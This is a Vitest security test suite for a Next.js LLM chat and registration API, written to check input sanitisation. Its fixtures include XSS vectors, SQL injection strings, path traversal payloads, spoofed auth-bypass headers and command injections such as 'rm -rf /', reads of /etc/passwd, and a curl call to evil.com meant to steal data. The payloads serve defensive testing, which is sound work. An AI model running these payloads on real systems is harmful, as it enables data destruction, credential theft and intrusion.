import { describe, it, expect, beforeEach, vi, afterEach } from 'vitest'
import { NextRequest } from 'next/server'
import { POST as chatPost } from '@/api/llm/chat/route'
import { POST as registerPost } from '@/api/auth/register/route'

// Mock dependencies
vi.mock('@/lib/llm-api-client', () => ({
  LLMClient: vi.fn().mockImplementation(() => ({
    chat: vi.fn().mockResolvedValue({
      content: 'Safe response',
      usage: { prompt_tokens: 10, completion_tokens: 5, total_tokens: 15 }
    }),
  })),
}))

vi.mock('@/lib/prisma', () => ({
  default: {
    user: {
      create: vi.fn(),
      findUnique: vi.fn(),
    },
  },
}))

vi.mock('bcryptjs', () => ({
  default: {
    hash: vi.fn().mockResolvedValue('hashed_password'),
  },
  hash: vi.fn().mockResolvedValue('hashed_password'),
}))

describe('Security Input Validation', () => {
  beforeEach(() => {
    vi.clearAllMocks()
  })

  afterEach(() => {
    vi.restoreAllMocks()
  })

  describe('XSS Prevention', () => {
    it('should sanitize script tags in chat messages', async () => {
      const maliciousRequest = {
        messages: [
          {
            role: 'user',
            content: '<script>alert("XSS attack")</script>Hello, how are you?'
          }
        ],
        provider: 'openai',
        model: 'gpt-3.5-turbo'
      }

      const request = new NextRequest('http://localhost:3000/api/llm/chat', {
        method: 'POST',
        body: JSON.stringify(maliciousRequest),
        headers: { 'Content-Type': 'application/json' }
      })

      const response = await chatPost(request)

      expect(response.status).toBe(200)

      // Verify the LLM client was called with sanitized content
      const { LLMClient } = await import('@/lib/llm-api-client')
      const mockInstance = LLMClient as any
      const chatCall = mockInstance.mock.instances[0].chat.mock.calls[0]
      const sanitizedMessage = chatCall[0][0].content

      expect(sanitizedMessage).not.toContain('<script>')
      expect(sanitizedMessage).toContain('Hello, how are you?')
    })

    it('should prevent HTML injection in user registration', async () => {
      const { default: prisma } = await import('@/lib/prisma')

      const maliciousUserData = {
        email: 'test@example.com',
        password: 'password123',
        name: '<img src="x" onerror="alert(\'XSS\')">'
      }

      prisma.user.findUnique.mockResolvedValue(null)
      prisma.user.create.mockResolvedValue({
        id: 'user-123',
        email: maliciousUserData.email,
        name: 'Safe Name', // Should be sanitized
        hashedPassword: 'hashed_password',
        createdAt: new Date(),
        updatedAt: new Date()
      })

      const request = new NextRequest('http://localhost:3000/api/auth/register', {
        method: 'POST',
        body: JSON.stringify(maliciousUserData),
        headers: { 'Content-Type': 'application/json' }
      })

      const response = await registerPost(request)

      expect(response.status).toBe(201)

      // Verify the database was called with sanitized data
      const createCall = prisma.user.create.mock.calls[0][0]
      expect(createCall.data.name).not.toContain('<img')
      expect(createCall.data.name).not.toContain('onerror')
    })

    it('should handle multiple XSS vectors', async () => {
      const xssVectors = [
        '<script>alert("xss1")</script>',
        'javascript:alert("xss2")',
        '<img src="x" onerror="alert(\'xss3\')">',
        '<svg onload="alert(\'xss4\')">',
        '"><script>alert("xss5")</script>',
        '<iframe src="javascript:alert(\'xss6\')"></iframe>',
        '<object data="javascript:alert(\'xss7\')"></object>',
        '<embed src="javascript:alert(\'xss8\')">',
        '<link rel="stylesheet" href="javascript:alert(\'xss9\')">',
        '<style>@import "javascript:alert(\'xss10\')"</style>',
      ]

      for (const vector of xssVectors) {
        const request = {
          messages: [{ role: 'user', content: `Test message: ${vector}` }],
          provider: 'openai',
          model: 'gpt-3.5-turbo'
        }

        const requestObj = new NextRequest('http://localhost:3000/api/llm/chat', {
          method: 'POST',
          body: JSON.stringify(request),
          headers: { 'Content-Type': 'application/json' }
        })

        const response = await chatPost(requestObj)

        expect(response.status).toBe(200)

        const { LLMClient } = await import('@/lib/llm-api-client')
        const mockInstance = LLMClient as any
        const lastCall = mockInstance.mock.instances[0].chat.mock.calls.slice(-1)[0]
        const sanitizedContent = lastCall[0][0].content

        expect(sanitizedContent).not.toContain('<script>')
        expect(sanitizedContent).not.toContain('javascript:')
        expect(sanitizedContent).not.toContain('onerror')
        expect(sanitizedContent).not.toContain('onload')
      }
    })
  })

  describe('SQL Injection Prevention', () => {
    it('should prevent SQL injection in email field', async () => {
      const { default: prisma } = await import('@/lib/prisma')

      const sqlInjectionAttempts = [
        "test'; DROP TABLE users; --",
        "test' UNION SELECT * FROM users --",
        "test'; INSERT INTO users (email) VALUES ('hacker@evil.com'); --",
        "test' OR '1'='1",
        "test'; UPDATE users SET email='hacked@evil.com' WHERE id=1; --"
      ]

      for (const maliciousEmail of sqlInjectionAttempts) {
        const userData = {
          email: maliciousEmail,
          password: 'password123',
          name: 'Test User'
        }

        prisma.user.findUnique.mockResolvedValue(null)

        const request = new NextRequest('http://localhost:3000/api/auth/register', {
          method: 'POST',
          body: JSON.stringify(userData),
          headers: { 'Content-Type': 'application/json' }
        })

        const response = await registerPost(request)

        // Should either reject with validation error or sanitize
        if (response.status === 201) {
          // If accepted, verify it was sanitized/parameterized properly
          const createCall = prisma.user.create.mock.calls.slice(-1)[0][0]
          expect(createCall.data.email).not.toContain('DROP TABLE')
          expect(createCall.data.email).not.toContain('UNION SELECT')
          expect(createCall.data.email).not.toContain('INSERT INTO')
        } else {
          // Should reject invalid email format
          expect(response.status).toBe(400)
        }
      }
    })
  })

  describe('Command Injection Prevention', () => {
    it('should prevent command injection in chat content', async () => {
      const commandInjectionAttempts = [
        '; rm -rf /',
        '$(rm -rf /)',
        '`rm -rf /`',
        '|| rm -rf /',
        '&& rm -rf /',
        '; cat /etc/passwd',
        '$(cat /etc/passwd)',
        '`cat /etc/passwd`',
        '; curl http://evil.com/steal-data',
        '$(curl http://evil.com/steal-data)'
      ]

      for (const injection of commandInjectionAttempts) {
        const request = {
          messages: [{ role: 'user', content: `Execute this: ${injection}` }],
          provider: 'openai',
          model: 'gpt-3.5-turbo'
        }

        const requestObj = new NextRequest('http://localhost:3000/api/llm/chat', {
          method: 'POST',
          body: JSON.stringify(request),
          headers: { 'Content-Type': 'application/json' }
        })

        const response = await chatPost(requestObj)

        expect(response.status).toBe(200)

        // Verify dangerous commands were sanitized or the request was rejected
        const { LLMClient } = await import('@/lib/llm-api-client')
        const mockInstance = LLMClient as any
        const lastCall = mockInstance.mock.instances[0].chat.mock.calls.slice(-1)[0]
        const processedContent = lastCall[0][0].content

        expect(processedContent).not.toContain('rm -rf')
        expect(processedContent).not.toContain('/etc/passwd')
        expect(processedContent).not.toContain('curl ')
      }
    })
  })

  describe('Path Traversal Prevention', () => {
    it('should prevent directory traversal attacks', async () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
      ]

      for (const path of pathTraversalAttempts) {
        const request = {
          messages: [{ role: 'user', content: `Show me file: ${path}` }],
          provider: 'openai',
          model: 'gpt-3.5-turbo'
        }

        const requestObj = new NextRequest('http://localhost:3000/api/llm/chat', {
          method: 'POST',
          body: JSON.stringify(request),
          headers: { 'Content-Type': 'application/json' }
        })

        const response = await chatPost(requestObj)

        expect(response.status).toBe(200)

        const { LLMClient } = await import('@/lib/llm-api-client')
        const mockInstance = LLMClient as any
        const lastCall = mockInstance.mock.instances[0].chat.mock.calls.slice(-1)[0]
        const processedContent = lastCall[0][0].content

        expect(processedContent).not.toContain('../')
        expect(processedContent).not.toContain('..\\')
        expect(processedContent).not.toContain('/etc/passwd')
        expect(processedContent).not.toContain('system32')
      }
    })
  })

  describe('Input Size Limits', () => {
    it('should reject oversized payloads', async () => {
      // Create very large message
      const largeContent = 'A'.repeat(1000000) // 1MB of 'A's

      const request = {
        messages: [{ role: 'user', content: largeContent }],
        provider: 'openai',
        model: 'gpt-3.5-turbo'
      }

      const requestObj = new NextRequest('http://localhost:3000/api/llm/chat', {
        method: 'POST',
        body: JSON.stringify(request),
        headers: { 'Content-Type': 'application/json' }
      })

      const response = await chatPost(requestObj)

      // Should reject with 413 Payload Too Large or 400 Bad Request
      expect([400, 413]).toContain(response.status)
    })

    it('should limit number of messages in conversation', async () => {
      // Create conversation with excessive number of messages
      const excessiveMessages = Array.from({ length: 1000 }, (_, i) => ({
        role: i % 2 === 0 ? 'user' : 'assistant',
        content: `Message ${i}`
      }))

      const request = {
        messages: excessiveMessages,
        provider: 'openai',
        model: 'gpt-3.5-turbo'
      }

      const requestObj = new NextRequest('http://localhost:3000/api/llm/chat', {
        method: 'POST',
        body: JSON.stringify(request),
        headers: { 'Content-Type': 'application/json' }
      })

      const response = await chatPost(requestObj)

      // Should either reject or truncate to reasonable limit
      if (response.status === 200) {
        const { LLMClient } = await import('@/lib/llm-api-client')
        const mockInstance = LLMClient as any
        const chatCall = mockInstance.mock.instances[0].chat.mock.calls[0]
        const processedMessages = chatCall[0]

        // Should be truncated to reasonable limit (e.g., 100 messages)
        expect(processedMessages.length).toBeLessThan(200)
      } else {
        expect(response.status).toBe(400)
      }
    })
  })

  describe('Content Security Policy', () => {
    it('should include proper CSP headers', async () => {
      const request = {
        messages: [{ role: 'user', content: 'Hello' }],
        provider: 'openai',
        model: 'gpt-3.5-turbo'
      }

      const requestObj = new NextRequest('http://localhost:3000/api/llm/chat', {
        method: 'POST',
        body: JSON.stringify(request),
        headers: { 'Content-Type': 'application/json' }
      })

      const response = await chatPost(requestObj)

      // Check for security headers
      const headers = response.headers

      // These headers might be set by middleware
      expect(
        headers.get('X-Content-Type-Options') ||
        headers.get('X-Frame-Options') ||
        headers.get('X-XSS-Protection')
      ).toBeDefined()
    })
  })

  describe('Rate Limiting Validation', () => {
    it('should enforce rate limits on API endpoints', async () => {
      const request = {
        messages: [{ role: 'user', content: 'Rate limit test' }],
        provider: 'openai',
        model: 'gpt-3.5-turbo'
      }

      // Simulate rapid requests
      const rapidRequests = Array.from({ length: 20 }, () =>
        chatPost(new NextRequest('http://localhost:3000/api/llm/chat', {
          method: 'POST',
          body: JSON.stringify(request),
          headers: { 'Content-Type': 'application/json' }
        }))
      )

      const responses = await Promise.all(rapidRequests)

      // Some requests should be rate limited
      const rateLimitedResponses = responses.filter(res => res.status === 429)
      expect(rateLimitedResponses.length).toBeGreaterThan(0)
    })
  })

  describe('Authentication Bypass Prevention', () => {
    it('should prevent authentication bypass attempts', async () => {
      const bypassAttempts = [
        { 'X-Forwarded-For': '127.0.0.1' },
        { 'X-Real-IP': 'localhost' },
        { 'X-Originating-IP': '127.0.0.1' },
        { 'Authorization': 'Bearer admin' },
        { 'Authorization': 'Bearer null' },
        { 'Authorization': 'Bearer undefined' },
        { 'Cookie': 'session=admin; admin=true' },
      ]

      for (const headers of bypassAttempts) {
        const request = {
          messages: [{ role: 'user', content: 'Admin access test' }],
          provider: 'openai',
          model: 'gpt-3.5-turbo'
        }

        const requestObj = new NextRequest('http://localhost:3000/api/llm/chat', {
          method: 'POST',
          body: JSON.stringify(request),
          headers: {
            'Content-Type': 'application/json',
            ...headers
          }
        })

        const response = await chatPost(requestObj)

        // Should not grant unauthorized access
        expect([200, 401, 403]).toContain(response.status)
      }
    })
  })

  describe('Data Validation', () => {
    it('should validate API key format', async () => {
      const invalidApiKeys = [
        '', // Empty
        'sk-invalid', // Too short
        'not-an-api-key', // Wrong format
        'sk-' + 'x'.repeat(200), // Too long
        '<script>alert("xss")</script>', // XSS attempt
        '; DROP TABLE api_keys; --', // SQL injection attempt
      ]

      for (const apiKey of invalidApiKeys) {
        const request = {
          messages: [{ role: 'user', content: 'Test with invalid key' }],
          provider: 'openai',
          model: 'gpt-3.5-turbo',
          apiKey
        }

        const requestObj = new NextRequest('http://localhost:3000/api/llm/chat', {
          method: 'POST',
          body: JSON.stringify(request),
          headers: { 'Content-Type': 'application/json' }
        })

        const response = await chatPost(requestObj)

        // Should reject invalid API keys
        expect([400, 401]).toContain(response.status)
      }
    })

    it('should validate provider and model combinations', async () => {
      const invalidCombinations = [
        { provider: 'openai', model: 'claude-3-sonnet' }, // Wrong model for provider
        { provider: 'anthropic', model: 'gpt-4' }, // Wrong model for provider
        { provider: 'invalid-provider', model: 'gpt-3.5-turbo' }, // Invalid provider
        { provider: '', model: 'gpt-3.5-turbo' }, // Empty provider
        { provider: 'openai', model: '' }, // Empty model
      ]

      for (const combination of invalidCombinations) {
        const request = {
          messages: [{ role: 'user', content: 'Test invalid combination' }],
          ...combination
        }

        const requestObj = new NextRequest('http://localhost:3000/api/llm/chat', {
          method: 'POST',
          body: JSON.stringify(request),
          headers: { 'Content-Type': 'application/json' }
        })

        const response = await chatPost(requestObj)

        // Should reject invalid combinations
        expect(response.status).toBe(400)
      }
    })
  })
})